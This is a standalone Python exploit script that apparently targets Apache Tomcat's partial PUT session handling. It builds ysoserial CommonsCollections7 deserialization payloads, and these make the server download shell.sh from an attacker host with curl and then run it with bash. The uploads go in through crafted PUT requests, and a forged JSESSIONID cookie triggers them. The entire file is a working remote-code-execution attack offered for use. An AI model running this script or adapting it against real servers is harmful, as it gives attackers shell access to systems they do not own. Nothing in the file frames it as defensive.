import requests
import random
import subprocess
import sys

# Check if all necessary arguments are provided
if len(sys.argv) != 4:
    print("Usage: python3 exploit.py <TARGET_URL> <ATTACKER_IP> <ATTACKER_PORT>")
    sys.exit(1)

TARGET = sys.argv[1]  # Get TARGET from command line argument
ATTACKER_IP = sys.argv[2]  # Get ATTACKER_IP from command line argument
ATTACKER_PORT = sys.argv[3]  # Get ATTACKER_PORT from command line argument (for downloading the shell)]  # Get UPLOAD_PORT from command line argument (for uploading to Tomcat)
SESSION_NAME = random.randint(1111, 9999)

# Generate the first payload to download the shell script from the attacker's server
def generate_payload1():
    command = [
        "java", "-jar", "ysoserial-all.jar", "CommonsCollections7",
        f"curl {ATTACKER_IP}:{ATTACKER_PORT}/shell.sh -o /tmp/shell.sh"
    ]
    with open("payload1.ser", "wb") as f:
        subprocess.run(command, stdout=f, stderr=subprocess.PIPE)
    print("[+] Payload1 (Download shell) created successfully.")

# Generate the second payload to execute the downloaded shell script
def generate_payload2():
    command = [
        "java", "-jar", "ysoserial-all.jar", "CommonsCollections7",
        "bash /tmp/shell.sh"
    ]
    with open("payload2.ser", "wb") as f:
        subprocess.run(command, stdout=f, stderr=subprocess.PIPE)
    print("[+] Payload2 (Execute shell) created successfully.")

# Upload a payload to the target using a different port for the upload (UPLOAD_PORT)
def upload_payload(payload_file):
    with open(payload_file, "rb") as f:
        payload = f.read()
    
    url = f"{TARGET}/{SESSION_NAME}/session"
    headers = {
        "Content-Range": f"bytes 0-{len(payload)}/{len(payload) + 10}",
        "Content-Length": str(len(payload))
    }
    
    response = requests.put(url, headers=headers, data=payload)
    
    if response.status_code in [200, 201, 204, 405]:
        print(f"[+] {payload_file} uploaded successfully.")
    else:
        print(f"[-] Upload failed for {payload_file}. Code: {response.status_code}")

# Trigger the exploit by modifying the session cookie
def trigger_exploit():
    url = f"{TARGET}/"
    headers = {
        "Cookie": f"JSESSIONID=.{SESSION_NAME}"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        print("[+] Payload activated successfully!")
    else:
        print(f"[-] Activation failed! Code: {response.status_code}")

if __name__ == "__main__":
    generate_payload1()
    upload_payload("payload1.ser")  # Upload first payload to download shell.sh
    trigger_exploit()

    generate_payload2()
    upload_payload("payload2.ser")  # Upload second payload to execute shell.sh
    
    trigger_exploit()
